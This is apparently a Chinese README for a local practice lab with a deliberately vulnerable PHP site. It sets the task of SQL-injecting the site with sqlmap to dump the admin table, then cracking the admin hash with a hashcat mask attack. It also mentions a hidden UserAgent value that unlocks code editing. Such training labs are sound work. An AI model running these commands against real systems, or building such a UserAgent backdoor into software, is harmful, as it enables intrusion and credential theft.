Intro

  • PHP 运行环境采用PHP5.4 x86，如果想更换PHP请更换对应PHP的DLL和EXE。
  • 双击start.bat，运行网站，打开http://127.0.0.1:3000即可。
  • 请用现代浏览器，强烈建议不要用IE8及以下，因为网站页面显示会乱。
  • 网站内存在一个漏洞，可以尝试手动注入或采用sqlmap进行注入，目前明小子啊D并不支持此漏洞。

Task

  • 破解后请将数据库中admin表的内容获取到。
  • 并将数据库中管理员密码破解出来,管理员的密码可能是六位的字母。

Step

  • 获取到有漏洞的URL。
  • 列出目标网站的有数据库：python sqlmap.py -u "url" --tables。
  • 列出目标数据库的所有列名：python sqlmap.py -u "url" -T table --columns。
  • 列出目标列下的所有内容python sqlmap.py -u "url" -T table column1,column2,column3 --dump。
  • 然后用hashcat破解hash值：hashcat -a 3 -o plain.txt hash.txt ?l?l?l?l?l?l。

Extra

  • 如果想在代码库里边添加代码，请更换浏览器的UserAgent为www/action/config.php中UACHECK的值（默认：123456）。
